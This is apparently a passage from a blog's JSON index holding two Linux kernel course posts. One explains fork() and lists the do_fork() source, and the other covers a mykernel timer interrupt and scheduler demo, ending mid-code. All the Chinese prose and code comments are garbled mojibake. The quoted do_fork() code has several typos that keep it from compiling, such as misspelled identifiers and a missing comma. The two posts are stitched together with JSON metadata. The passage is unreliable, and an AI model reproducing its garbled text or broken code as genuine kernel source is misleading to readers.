forkè¯­å¥çš„è¿”å›å€¼,forkç³»ç»Ÿè°ƒç”¨è°ƒç”¨ä¸€æ¬¡, è¿”å›ä¸¤æ¬¡, åœ¨è¿™é‡Œæœ‰å¯èƒ½æœ‰ä¸‰ç§è¿”å›å€¼\nåœ¨çˆ¶è¿›ç¨‹ä¸­ï¼Œforkè¿”å›æ–°åˆ›å»ºå­è¿›ç¨‹çš„è¿›ç¨‹ID åœ¨å­è¿›ç¨‹ä¸­ï¼Œforkè¿”å›0 å¦‚æœå‡ºç°é”™è¯¯ï¼Œforkè¿”å›ä¸€ä¸ªè´Ÿå€¼ æ‰€æœ‰åœ¨è¿™æ®µä»£ç ä¸­, å¦‚æœpid = fork()æ‰§è¡ŒæˆåŠŸ, é‚£å°±æœ‰ä¸¤ä¸ªè¿›ç¨‹äº†, ä¸€ä¸ªçˆ¶è¿›ç¨‹å’Œä¸€ä¸ªå­è¿›ç¨‹, åœ¨å­è¿›ç¨‹ä¸­ï¼Œforkå‡½æ•°è¿”å›0ï¼Œåœ¨çˆ¶è¿›ç¨‹ä¸­ï¼Œforkè¿”å›æ–°åˆ›å»ºå­è¿›ç¨‹çš„è¿›ç¨‹IDã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡forkè¿”å›çš„å€¼æ¥åˆ¤æ–­å½“å‰è¿›ç¨‹æ˜¯å­è¿›ç¨‹è¿˜æ˜¯çˆ¶è¿›ç¨‹ã€‚\nforkå‡ºé”™å¯èƒ½æœ‰ä¸¤ç§åŸå› ï¼š\nå½“å‰çš„è¿›ç¨‹æ•°å·²ç»è¾¾åˆ°äº†ç³»ç»Ÿè§„å®šçš„ä¸Šé™ï¼Œè¿™æ—¶errnoçš„å€¼è¢«è®¾ç½®ä¸ºEAGAINã€‚ç³»ç»Ÿå†…å­˜ä¸è¶³ï¼Œè¿™æ—¶errnoçš„å€¼è¢«è®¾ç½®ä¸ºENOMEMã€‚ åˆ›å»ºæ–°è¿›ç¨‹æˆåŠŸåï¼Œç³»ç»Ÿä¸­å‡ºç°ä¸¤ä¸ªåŸºæœ¬å®Œå…¨ç›¸åŒçš„è¿›ç¨‹ï¼Œè¿™ä¸¤ä¸ªè¿›ç¨‹æ‰§è¡Œæ²¡æœ‰å›ºå®šçš„å…ˆåé¡ºåºï¼Œå“ªä¸ªè¿›ç¨‹å…ˆæ‰§è¡Œè¦çœ‹ç³»ç»Ÿçš„è¿›ç¨‹è°ƒåº¦ç­–ç•¥ã€‚ å‚è€ƒåšæ–‡: linuxä¸­forkï¼ˆï¼‰å‡½æ•°è¯¦è§£ï¼ˆåŸåˆ›ï¼ï¼å®ä¾‹è®²è§£ï¼‰\nforkå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨è¿‡ç¨‹ åœ¨ Linux å†…æ ¸ä¸­,ä¾›ç”¨æˆ·åˆ›å»ºè¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨fork()å‡½æ•°çš„å“åº”å‡½æ•°æ˜¯ sys_fork()ã€sys_clone()ã€sys_vfork()ã€‚\nè¿™ä¸‰ä¸ªå‡½æ•°éƒ½æ˜¯é€šè¿‡è°ƒç”¨å†…æ ¸å‡½æ•° do_fork() æ¥å®ç°çš„ã€‚æ ¹æ®è°ƒç”¨æ—¶æ‰€ä½¿ç”¨çš„ clone_flags å‚æ•°ä¸åŒï¼Œdo_fork() å‡½æ•°å®Œæˆçš„å·¥ä½œä¹Ÿå„å¼‚ã€‚ä¸‹é¢åˆ†ædo_fork(), è¯¥å‡½æ•°ä¸»è¦ä½œç”¨æ˜¯å¤åˆ¶åŸæ¥çš„è¿›ç¨‹æˆä¸ºå¦ä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œå®ƒå®Œæˆäº†æ•´ä¸ªè¿›ç¨‹çš„åˆ›å»ºè¿‡ç¨‹ã€‚\ndo_fork()å‡½æ•°çš„å‡ ä¸ªå‚æ•°: clone_flagsï¼šè¯¥æ ‡å¿—ä½çš„4ä¸ªå­—èŠ‚åˆ†ä¸ºä¸¤éƒ¨åˆ†ã€‚æœ€ä½çš„ä¸€ä¸ªå­—èŠ‚ä¸ºå­è¿›ç¨‹ç»“æŸæ—¶å‘é€ç»™çˆ¶è¿›ç¨‹çš„ä¿¡å·ä»£ç ï¼Œé€šå¸¸ä¸ºSIGCHLDï¼›å‰©ä½™çš„ä¸‰ä¸ªå­—èŠ‚åˆ™æ˜¯å„ç§cloneæ ‡å¿—çš„ç»„åˆã€‚é€šè¿‡cloneæ ‡å¿—å¯ä»¥æœ‰é€‰æ‹©çš„å¯¹çˆ¶è¿›ç¨‹çš„èµ„æºè¿›è¡Œå¤åˆ¶ã€‚ä¾‹å¦‚CLONE_VMè¡¨ç¤ºå…±äº«å†…å­˜æè¿°ç¬¦åˆæ‰€æœ‰çš„é¡µè¡¨ï¼› CLONE_FSå…±äº«æ ¹ç›®å½•å’Œå½“å‰å·¥ä½œç›®å½•æ‰€åœ¨çš„è¡¨ä»¥åŠæƒé™æ©ç ã€‚\nstatck_startï¼šå­è¿›ç¨‹ç”¨æˆ·æ€å †æ ˆçš„åœ°å€ï¼›\nregsï¼šæŒ‡å‘pt_regsç»“æ„ä½“çš„æŒ‡é’ˆã€‚å½“ç³»ç»Ÿå‘ç”Ÿç³»ç»Ÿè°ƒç”¨ï¼Œå³ç”¨æˆ·è¿›ç¨‹ä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€æ—¶ï¼Œè¯¥ç»“æ„ä½“ä¿å­˜é€šç”¨å¯„å­˜å™¨ä¸­çš„å€¼ï¼Œå¹¶è¢«å­˜æ”¾äºå†…æ ¸æ€çš„å †æ ˆä¸­ï¼›\nstack_sizeï¼šæœªè¢«ä½¿ç”¨ï¼Œé€šå¸¸è¢«èµ‹å€¼ä¸º0ï¼›\nparent_tidptrï¼šçˆ¶è¿›ç¨‹åœ¨ç”¨æˆ·æ€ä¸‹pidçš„åœ°å€ï¼Œè¯¥å‚æ•°åœ¨CLONE_PARENT_SETTIDæ ‡å¿—è¢«è®¾å®šæ—¶æœ‰æ„ä¹‰ï¼›\nchild_tidptrï¼šå­è¿›ç¨‹åœ¨ç”¨æˆ·æ€ä¸‹pidçš„åœ°å€ï¼Œè¯¥å‚æ•°åœ¨CLONE_CHILD_SETTIDæ ‡å¿—è¢«è®¾å®šæ—¶æœ‰æ„ä¹‰ã€‚\ndo_fork() å‡½æ•°ç”Ÿæˆä¸€ä¸ªæ–°çš„è¿›ç¨‹ å»ºç«‹è¿›ç¨‹æ§åˆ¶ç»“æ„å¹¶èµ‹åˆå€¼ï¼Œä½¿å…¶æˆä¸ºè¿›ç¨‹æ˜ åƒã€‚è¿™ä¸ªè¿‡ç¨‹å®Œæˆä»¥ä¸‹å†…å®¹ã€‚ åœ¨å†…å­˜ä¸­åˆ†é…ä¸€ä¸ª task_struct æ•°æ®ç»“æ„ï¼Œä»¥ä»£è¡¨å³å°†äº§ç”Ÿçš„æ–°è¿›ç¨‹ã€‚ æŠŠçˆ¶è¿›ç¨‹ PCB çš„å†…å®¹å¤åˆ¶åˆ°æ–°è¿›ç¨‹çš„ PCB ä¸­ã€‚ **ä¸ºæ–°è¿›ç¨‹åˆ†é…ä¸€ä¸ªå”¯ä¸€çš„è¿›ç¨‹æ ‡è¯†å· PID å’Œ user_struct ç»“æ„ã€‚**ç„¶åæ£€æŸ¥ç”¨æˆ·å…·æœ‰æ‰§è¡Œä¸€ä¸ªæ–°è¿›ç¨‹æ‰€å¿…é¡»å…·æœ‰çš„èµ„æºã€‚ é‡æ–°è®¾ç½® task_struct ç»“æ„ä¸­é‚£äº›ä¸çˆ¶è¿›ç¨‹å€¼ä¸åŒçš„æ•°æ®æˆå‘˜ã€‚ è®¾ç½®è¿›ç¨‹ç®¡ç†ä¿¡æ¯ï¼Œæ ¹æ®æ‰€æä¾›çš„ clone_flags å‚æ•°å€¼ï¼Œå†³å®šæ˜¯å¦å¯¹çˆ¶è¿›ç¨‹ task_struct ä¸­çš„æŒ‡é’ˆ fs ã€files æŒ‡é’ˆç­‰æ‰€é€‰æ‹©çš„éƒ¨åˆ†è¿›è¡Œæ‹·è´ï¼Œå¦‚æœ clone_flags å‚æ•°æŒ‡æ˜çš„æ˜¯å…±äº«è€Œä¸æ˜¯æ‹·è´ï¼Œåˆ™å°†å…¶è®¡æ•°å™¨ count çš„å€¼åŠ  1 ï¼Œå¦åˆ™å°±æ‹·è´æ–°è¿›ç¨‹æ‰€éœ€è¦çš„ç›¸å…³ä¿¡æ¯å†…å®¹ PCB ã€‚è¿™ä¸ªåœ°æ–¹æ˜¯åŒºåˆ† sys_fork() è¿˜æ˜¯ sys_clone() ã€‚ å¿…é¡»ä¸ºæ–°è¿›ç¨‹çš„æ‰§è¡Œè®¾ç½®è·Ÿè¸ªè¿›ç¨‹æ‰§è¡Œæƒ…å†µçš„ç›¸å…³å†…æ ¸æ•°æ®ç»“æ„ã€‚åŒ…æ‹¬ ä»»åŠ¡æ•°ç»„ã€è‡ªç”±æ—¶é—´åˆ—è¡¨ tarray_freelist ä»¥åŠ pidhash[] æ•°ç»„ã€‚è¿™éƒ¨åˆ†å®Œæˆå¦‚ä¸‹å†…å®¹ï¼š æŠŠæ–°è¿›ç¨‹åŠ å…¥åˆ°è¿›ç¨‹é“¾è¡¨ä¸­ æŠŠæ–°è¿›ç¨‹åŠ å…¥åˆ° pidhash æ•£åˆ—è¡¨ä¸­ï¼Œå¹¶å¢åŠ ä»»åŠ¡è®¡æ•°å€¼ã€‚ é€šè¿‡æ‹·è´çˆ¶è¿›ç¨‹çš„ä¸Šã€ä¸‹æ–‡æ¥åˆå§‹åŒ–ç¡¬ä»¶çš„ä¸Šä¸‹æ–‡ï¼ˆTSSæ®µã€LDTä»¥åŠ GDTï¼‰ã€‚ å¯åŠ¨è°ƒåº¦ç¨‹åºï¼Œä½¿å­è¿›ç¨‹è·å¾—è¿è¡Œçš„æœºä¼šã€‚è¿™éƒ¨åˆ†å®Œæˆä»¥ä¸‹åŠ¨ä½œï¼š è®¾ç½®æ–°çš„å°±ç»ªé˜Ÿåˆ—çŠ¶æ€ TASK_RUNING , å¹¶å°†æ–°è¿›ç¨‹æŒ‚åˆ°å°±ç»ªé˜Ÿåˆ—ä¸­ï¼Œå¹¶é‡æ–°å¯åŠ¨è°ƒåº¦ç¨‹åºä½¿å…¶è¿è¡Œã€‚ å‘çˆ¶è¿›ç¨‹è¿”å›å­è¿›ç¨‹çš„ PIDï¼Œè®¾ç½®å­è¿›ç¨‹ä» do_fork() è¿”å› 0 å€¼ã€‚ int do_fork(unsigned long clone_flags,unsigned long stack_start, struct pt_regs *regs,\runsigned long stack_size)\r{\rint retval;\rstruct task_struct *p;\rstruct completion vfork;\rretval = -EPERM ;\rif ( clone_flags \u0026amp; CLONE_PID )\r{\rif ( current-\u0026gt;pid )\rgoto fork_out;\r}\rreval = -ENOMEM ;\rp = alloc_task_struct(); // åˆ†é…å†…å­˜å»ºç«‹æ–°è¿›ç¨‹çš„ task_struct ç»“æ„\rif ( !p )\rgoto fork_out;\r*p = *current ; //å°†å½“å‰è¿›ç¨‹çš„ task_struct ç»“æ„çš„å†…å®¹å¤åˆ¶ç»™æ–°è¿›ç¨‹çš„ PCBç»“æ„\rretval = -EAGAIN;\r//ä¸‹é¢ä»£ç å¯¹çˆ¶ã€å­è¿›ç¨‹ task_struct ç»“æ„ä¸­ä¸åŒå€¼çš„æ•°æ®æˆå‘˜è¿›è¡Œèµ‹å€¼\rif ( atomic_read ( \u0026amp;p-\u0026gt;user-\u0026gt;processes ) \u0026gt;= p-\u0026gt;rlim[RLIMIT_NPROC].rlim_cur\r\u0026amp;\u0026amp; !capable( CAP_SYS_ADMIN ) \u0026amp;\u0026amp; !capable( CAP_SYS_RESOURCE ))\rgoto bad_fork_free;\ratomic_inc ( \u0026amp;p-\u0026gt;user-\u0026gt;__count); //count è®¡æ•°å™¨åŠ  1\ratomic_inc ( \u0026amp;p-\u0026gt;user-\u0026gt;processes); //è¿›ç¨‹æ•°åŠ  1\rif ( nr_threads \u0026gt;= max_threads )\rgoto bad_fork_cleanup_count ;\rget_exec_domain( p-\u0026gt;exec_domain );\rif ( p-\u0026gt;binfmt \u0026amp;\u0026amp; p-\u0026gt;binfmt-\u0026gt;module )\r__MOD_INC_USE_COUNT( p-\u0026gt;binfmt-\u0026gt;module ); //å¯æ‰§è¡Œæ–‡ä»¶ binfmt ç»“æ„å…±äº«è®¡æ•° + 1 p-\u0026gt;did_exec = 0 ; //è¿›ç¨‹æœªæ‰§è¡Œ\rp-\u0026gt;swappable = 0 ; //è¿›ç¨‹ä¸å¯æ¢å‡º\rp-\u0026gt;state = TASK_UNINTERRUPTIBLE ; //ç½®è¿›ç¨‹çŠ¶æ€\rcopy_flags( clone_flags,p ); //æ‹·è´è¿›ç¨‹æ ‡å¿—ä½\rp-\u0026gt;pid = get_pid( clone_flags ); //ä¸ºæ–°è¿›ç¨‹åˆ†é…è¿›ç¨‹æ ‡å¿—å·\rp-\u0026gt;run_list.next = NULL ;\rp-\u0026gt;run_list.prev = NULL ;\rp-\u0026gt;run_list.cptr = NULL ;\rinit_waitqueue_head( \u0026amp;p-\u0026gt;wait_childexit ); //åˆå§‹åŒ– wait_childexit é˜Ÿåˆ—\rp-\u0026gt;vfork_done = NULL ;\rif ( clone_flags \u0026amp; CLONE_VFORK ) {\rp-\u0026gt;vfork_done = \u0026amp;vfork ; init_completion(\u0026amp;vfork) ;\r}\rspin_lock_init( \u0026amp;p-\u0026gt;alloc_lock );\rp-\u0026gt;sigpending = 0 ;\rinit_sigpending( \u0026amp;p-\u0026gt;pending );\rp-\u0026gt;it_real_value = p-\u0026gt;it_virt_value = p-\u0026gt;it_prof_value = 0 ; //åˆå§‹åŒ–æ—¶é—´æ•°æ®æˆå‘˜\rp-\u0026gt;it_real_incr = p-\u0026gt;it_virt_incr = p-\u0026gt;it_prof_incr = 0 ; //åˆå§‹åŒ–å®šæ—¶å™¨ç»“æ„\rinit_timer( \u0026amp;p-\u0026gt;real_timer );\rp-\u0026gt;real_timer.data = (unsigned long)p;\rp-\u0026gt;leader = 0 ;\rp-\u0026gt;tty_old_pgrp = 0 ;\rp-\u0026gt;times.tms_utime = p-\u0026gt;times.tms_stime = 0 ; //åˆå§‹åŒ–è¿›ç¨‹çš„å„ç§è¿è¡Œæ—¶é—´\rp-\u0026gt;times.tms_cutime = p-\u0026gt;times.tms_cstime = 0 ;\r#ifdef CONFIG_SMP //åˆå§‹åŒ–å¯¹ç§°å¤„ç†å™¨æˆå‘˜\r{\rint i;\rp-\u0026gt;cpus_runnable = ~0UL;\rp-\u0026gt;processor = current-\u0026gt;processor ;\rfor( i = 0 ; i \u0026lt; smp_num_cpus ; i++ )\rp-\u0026gt;per_cpu_utime[ i ] = p-\u0026gt;per_cpu_stime[ i ] = 0;\rspin_lock_init ( \u0026amp;p-\u0026gt;sigmask_lock );\r}\r#endif\rp-\u0026gt;lock_depth = -1 ; // æ³¨æ„ï¼šè¿™é‡Œ -1 ä»£è¡¨ no ,è¡¨ç¤ºåœ¨ä¸Šä¸‹æ–‡åˆ‡æ¢æ—¶ï¼Œå†…æ ¸ä¸ä¸Šé”\rp-\u0026gt;start_time = jiffies ; // è®¾ç½®è¿›ç¨‹çš„èµ·å§‹æ—¶é—´\rINIT_LIST_HEAD ( \u0026amp;p-\u0026gt;local_pages );\rretval = -ENOMEM ;\rif ( copy_files ( clone_flags , p )) //æ‹·è´çˆ¶è¿›ç¨‹çš„ files æŒ‡é’ˆï¼Œå…±äº«çˆ¶è¿›ç¨‹å·²æ‰“å¼€çš„æ–‡ä»¶\rgoto bad_fork_cleanup ;\rif ( copy_fs ( clone_flags , p )) //æ‹·è´çˆ¶è¿›ç¨‹çš„ fs æŒ‡é’ˆï¼Œå…±äº«çˆ¶è¿›ç¨‹æ–‡ä»¶ç³»ç»Ÿ\rgoto bad_fork_cleanup_files ;\rif ( copy_sighand ( clone_flags , p )) //å­è¿›ç¨‹å…±äº«çˆ¶è¿›ç¨‹çš„ä¿¡å·å¤„ç†å‡½æ•°æŒ‡é’ˆ\rgoto bad_fork_cleanup_fs ;\rif ( copy_mm ( clone_flags , p ))\rgoto bad_fork_cleanup_mm ; //æ‹·è´çˆ¶è¿›ç¨‹çš„ mm ä¿¡æ¯ï¼Œå…±äº«å­˜å‚¨ç®¡ç†ä¿¡æ¯\rretval = copy_thread( 0 , clone_flags , stack_start, stack_size , p regs );\r//åˆå§‹åŒ– TSSã€LDTä»¥åŠGDTé¡¹\rif ( retval )\rgoto bad_fork_cleanup_mm ;\rp-\u0026gt;semundo = NULL ; //åˆå§‹åŒ–ä¿¡å·é‡æˆå‘˜\rp-\u0026gt;prent_exec_id = p-self_exec_id ;\rp-\u0026gt;swappable = 1 ; //è¿›ç¨‹å ç”¨çš„å†…å­˜é¡µé¢å¯æ¢å‡º\rp-\u0026gt;exit_signal = clone_flag \u0026amp; CSIGNAL ;\rp-\u0026gt;pdeatch_signal = 0 ; //æ³¨æ„ï¼šè¿™é‡Œæ˜¯çˆ¶è¿›ç¨‹æ¶ˆäº¡åå‘é€çš„ä¿¡å·\rp-\u0026gt;counter = (current-\u0026gt;counter + 1) \u0026gt;\u0026gt; 1 ;//è¿›ç¨‹åŠ¨æ€ä¼˜å…ˆçº§ï¼Œè¿™é‡Œè®¾ç½®æˆçˆ¶è¿›ç¨‹çš„ä¸€åŠ,åº”æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ˜¯é‡‡ç”¨ä½æ“ä½œæ¥å®ç°çš„ã€‚\rcurrent-\u0026gt;counter \u0026gt;\u0026gt; =1;\rif ( !current-\u0026gt;counter )\rcurrent-\u0026gt;need_resched = 1 ; //ç½®ä½é‡æ–°è°ƒåº¦æ ‡è®°ï¼Œå®é™…ä¸Šä»è¿™ä¸ªåœ°æ–¹å¼€å§‹ï¼Œåˆ†è£‚æˆäº†çˆ¶å­ä¸¤ä¸ªè¿›ç¨‹ã€‚\rretval = p-\u0026gt;pid ;\rp-\u0026gt;tpid = retval ;\rINIT_LIST_HEAD( \u0026amp;p-\u0026gt;thread_group );\rwrite_lock_irq( \u0026amp;tasklist_lock );\rp-\u0026gt;p_opptr = current-\u0026gt;p_opptr ;\rp-\u0026gt;p_pptr = current-\u0026gt;p_pptr ;\rif ( !( clone_flags \u0026amp; (CLONE_PARENT | CLONE_THREAD ))) {\rp-\u0026gt;opptr = current ;\rif ( !(p-\u0026gt;ptrace \u0026amp; PT_PTRACED) )\rp-\u0026gt;p_pptr = current ;\r}\rif ( clone_flags \u0026amp; CLONE_THREAD ){\rp-\u0026gt;tpid = current-\u0026gt;tpid ;\rlist_add ( \u0026amp;p-\u0026gt;thread_group,\u0026amp;current-\u0026gt;thread_group );\r}\rSET_LINKS(p);\rhash_pid(p);\rnr_threads++;\rwrite_unlock_irq( \u0026amp;tasklist_lock );\rif ( p-\u0026gt;ptrace \u0026amp; PT_PTRACED )\rsend_sig( SIGSTOP , p ,1 );\rwake_up_process(p); //æŠŠæ–°è¿›ç¨‹åŠ å…¥è¿è¡Œé˜Ÿåˆ—ï¼Œå¹¶å¯åŠ¨è°ƒåº¦ç¨‹åºé‡æ–°è°ƒåº¦ï¼Œä½¿æ–°è¿›ç¨‹è·å¾—è¿è¡Œæœºä¼š\r++total_forks ; if ( clone_flags \u0026amp; CLONE_VFRK )\rwait_for_completion(\u0026amp;vfork);\r//ä»¥ä¸‹æ˜¯å‡ºé”™å¤„ç†éƒ¨åˆ†\rfork_out:\rreturn retval;\rbad_fork_cleanup_mm:\rexit_mm(p);\rbad_fork_cleanup_sighand:\rexit_sighand(p);\rbad_fork_cleanup_fs:\rexit_fs(p);\rbad_fork_cleanup_files:\rexit_files(p);\rbad_fork_cleanup:\rput_exec_domain( p-\u0026gt;exec_domain );\rif ( p-\u0026gt;binfmt \u0026amp;\u0026amp; p-\u0026gt;binfmt-\u0026gt;module )\r__MOD_DEC_USE_COUNT( p-\u0026gt;binfmt-\u0026gt;module );\rbad_fork_cleanup_count:\ratomic_dec( \u0026amp;p-\u0026gt;user-\u0026gt;processes );\rfree_uid ( p-\u0026gt;user );\rbad_fork_free:\rfree_task_struct(p);\rgoto fork_out;\r}\rå®éªŒ å®éªŒæ˜¯åœ¨å®éªŒæ¥¼å®Œæˆçš„:\næ€»ç»“: æ–°è¿›ç¨‹çš„æ‰§è¡Œèµ·ç‚¹ä¸º: ret_form_fork\nå½“ä»–ä»ret_from_forké€€å‡ºæ—¶ï¼Œä¼šä»å †æ ˆä¸­å¼¹å‡ºåŸæ¥ä¿å­˜çš„eipï¼Œè€ŒipæŒ‡å‘kernel_thread_helper,\nè‡³æ­¤kernel_thread_helperè¢«è°ƒç”¨ï¼Œä»–å°±èƒ½å¤Ÿè¿è¡Œæˆ‘ä»¬çš„æŒ‡å®šçš„å‡½æ•°äº†do_exit(). do_forkçš„æ‰§è¡Œæµç¨‹å¯å¦‚ä¸‹å›¾è¡¨ç¤º:\nå›¾æ‘˜è‡ª: Linuxè¿›ç¨‹åˆ‡æ¢\n","date":1425733467,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1425733467,"objectID":"b237d04f3dd6a0b7f81e8bd9b96277d2","permalink":"http://www.guozet.me/post/Linux-kernel-analysis-building-task/","publishdate":"2015-03-07T13:04:27Z","relpermalink":"/post/Linux-kernel-analysis-building-task/","section":"post","summary":"Linuxå†…æ ¸è¯¾ç¬¬å…­å‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚\nå”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\n","tags":"Linux kernel","title":"Linuxå†…æ ¸åˆ†æè¯¾ç¨‹6_è¿›ç¨‹åˆ›å»º","type":"post"},{"authors":null,"categories":"Linux","content":"Linuxå†…æ ¸è¯¾ç¬¬äºŒå‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚\nå”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\nè®¡ç®—æœºæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼ˆå°ç»“ï¼‰ æ¦‚å¿µ è®¡ç®—æœºçš„å·¥ä½œï¼Œä¸€è¨€ä»¥è”½ä¹‹ï¼šæ‰§è¡Œç¨‹åºçš„è¿‡ç¨‹ï¼›ä¹Ÿå°±æ˜¯å­˜å‚¨ç¨‹åºå’Œ ç¨‹åºæ§åˆ¶çš„è¿‡ç¨‹ã€‚\nå­˜å‚¨ç¨‹åºè®¡ç®—æœºå·¥ä½œæ¨¡å‹ï¼Œè®¡ç®—æœºç³»ç»Ÿæœ€æœ€åŸºç¡€æ€§çš„é€»è¾‘ç»“æ„ å‡½æ•°è°ƒç”¨å †æ ˆï¼Œé«˜çº§è¯­è¨€å¾—ä»¥è¿è¡Œçš„åŸºç¡€ ä¸­æ–­ï¼Œå¤šé“ç¨‹åºæ“ä½œç³»ç»Ÿçš„åŸºç‚¹ ä»¥ä¾‹åˆ†æ ä¸€ä¸ªç®€å•çš„ä¸­æ–­çš„ä¾‹å­(ç‚¹å‡»è¿›å…¥)\nç®€è¦åˆ†æmymain.cä¸myinterrupt.c void __init my_start_kernel(void) // mymain.cä¸­ä¸»è¦å†…å®¹ { int i = 0; while (1) { i++; if (i % 100000 == 0) //æ¯å¾ªç¯åä¸‡æ¬¡æ‰“å°ä¸€æ¬¡my_start_kernel here printk(KERN_NOTICE \u0026quot;my_start_kernel here %d \\n\u0026quot;, i); } } void my_timer_handler(void) //æ¯æ¬¡æ—¶é’Ÿä¸­æ–­è°ƒç”¨ä¸€æ¬¡ myinterrupt.cä¸­ä¸»è¦å†…å®¹ { printk(KERN_NOTICE \u0026quot;\\n\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;my_timer_handler here\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\\n\\n\u0026quot;); } å¯è§ï¼Œè¿™åªæ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„æ—¶é’Ÿä¸­æ–­æ¼”ç¤ºå®éªŒï¼Œæ‰§è¡Œç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š\nå¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°ï¼Œæ—¶é’Ÿæ¯è®°æ•°åˆ°åä¸‡çš„æ—¶å€™ï¼Œæ‰“å°ä¸€ä¸ªmy_start_kernel hereï¼Œæ—¶é’Ÿä¸­æ–­çš„æ—¶å€™æ‰§è¡Œmy_time_hander here.\nåœ¨ç¬¬ä¸€ä¸ªçš„åŸºç¡€ä¸Šè¿›è¡Œæ—¶é—´ç‰‡è½®è½¬å¤šé“ç¨‹åºçš„å°os. ä¸»è¦å¯¹mypcb.h, mymain.c å’Œmyinterrupt.cè¿™ä¸‰ä¸ªæ–‡ä»¶è¿›è¡Œåˆ†æ\nmypcb.h / * linux/mykernel/**mypcb.h** * Kernel internal PCB types * Copyright (C) 2013 Mengning */ #define MAX_TASK_NUM 4 #define KERNEL_STACK_SIZE 1024*8 /* CPU-specific state of this task */ struct Thread {//ç»™ä»»åŠ¡å®šä¹‰ä¸€ä¸ªeipå’Œesp unsigned longip; unsigned longsp; }; typedef struct PCB{ int pid;//ä»»åŠ¡ç¼–å· volatile long state;/* -1 unrunnable, 0 runnable, \u0026gt;0 stopped */ char stack[KERNEL_STACK_SIZE]; //å®šä¹‰æ ˆç©ºé—´ /* CPU-specific state of this task */ struct Thread thread; //å®šä¹‰è¿›ç¨‹çš„ç»“æ„ä½“thread, å…¶ä¸­æœ‰eipå’Œesp unsigned longtask_entry;//ä»»åŠ¡çš„å‡½æ•°èµ·å§‹å¤„, ä¹Ÿå°±æ˜¯ä»»åŠ¡ç¬¬ä¸€æ¬¡æ‰§è¡Œçš„èµ·å§‹ä½ç½® struct PCB *next;//ä¸€ä¸ªä»»åŠ¡é“¾è¡¨, æŒ‡å‘ä¸‹ä¸€ä¸ªä»»åŠ¡ }tPCB; void my_schedule(void);//ä»»åŠ¡è°ƒåŠ¨å‡½æ•°** mymain.c /* linux/mykernel/mymain.c * Kernel internal my_start_kernel * Copyright (C) 2013 Mengning */ #include \u0026lt;linux/types.h\u0026gt; #include \u0026lt;linux/string.h\u0026gt; #include \u0026lt;linux/ctype.h\u0026gt; #include \u0026lt;linux/tty.h\u0026gt; #include \u0026lt;linux/vmalloc.h\u0026gt; #include \u0026quot;mypcb.h\u0026quot; //å¼•å…¥å…¶ä¸­ä¸¤ä¸ªç»“æ„ä½“è¡¨ç¤º** tPCB task[MAX_TASK_NUM];//å®šä¹‰ä¸¤ä¸ªæ•°ç»„ tPCB * my_current_task = NULL; volatile int my_need_sched = 0;//å®šä¹‰æ˜¯å¦è°ƒåº¦, 1åˆ™è°ƒåº¦, 0åˆ™ä¸è°ƒåº¦ void my_process(void); void __init my_start_kernel(void) **//èµ·å§‹å‡½æ•°ä½ç½®** { int pid = 0; int i; /* Initialize process 0*/ task[pid].pid = pid; task[pid].state = 0;/* -1 unrunnable, 0 runnable, \u0026gt;0 stopped */ task[pid].task_entry = task[pid].thread.ip = (unsigned long)my_process; task[pid].thread.sp = (unsigned long)\u0026amp;task[pid].stack[KERNEL_STACK_SIZE-1]; //0å·è¿›ç¨‹æ ˆåœ¨æœ€å¼€å§‹çš„ä½ç½®** task[pid].next = \u0026amp;task[pid];//ä¸‹ä¸€ä¸ªä»»åŠ¡ä¹Ÿæ˜¯è‡ªå·±ï¼Œåœ¨è¿™é‡Œï¼Œå…¶ä»–ä»»åŠ¡è¿˜æ²¡æœ‰åˆ›å»º /*fork more process *///åˆ›å»ºå¤šä¸ªä»»åŠ¡ for(i=1;i\u0026lt;MAX_TASK_NUM;i++) { memcpy(\u0026amp;task[i],\u0026amp;task[0],sizeof(tPCB));//å¤åˆ¶0å·è¿›ç¨‹çš„ç»“æ„å½¢å¼ task[i].pid = i; task[i].state = -1;//åˆå§‹çš„ä»»åŠ¡(é™¤0å·è¿›ç¨‹å¤–)éƒ½è®¾ç½®æˆæœªè¿è¡Œ task[i].thread.sp = (unsigned long)\u0026amp;task[i].stack[KERNEL_STACK_SIZE-1]; task[i].next = task[i-1].next;//æ–°forkçš„è¿›ç¨‹åŠ åˆ°è¿›ç¨‹é“¾è¡¨çš„å°¾éƒ¨, è¯¥æ–°å»ºä»»åŠ¡çš„nextæŒ‡å‘ä¸Šä¸€ä¸ªä»»åŠ¡çš„next,ä¹Ÿå°±æ˜¯è‡ªå·±ï¼ˆæœ€åä¸€ä¸ªï¼‰ task[i-1].next = \u0026amp;task[i]; //é…ç½®ä¸Šä¸€ä¸ªä»»åŠ¡çš„nextæŒ‡å‘è¿™æ—¶å€™æ–°åˆ›å»ºçš„ä»»åŠ¡ } /* start process 0 by task[0] */ pid = 0; my_current_task = \u0026amp;task[pid];//å…ˆè®©0å·è¿›ç¨‹å…ˆæ‰§è¡Œ asm volatile( \u0026quot;movl %1,%%esp\\n\\t\u0026quot; /* set 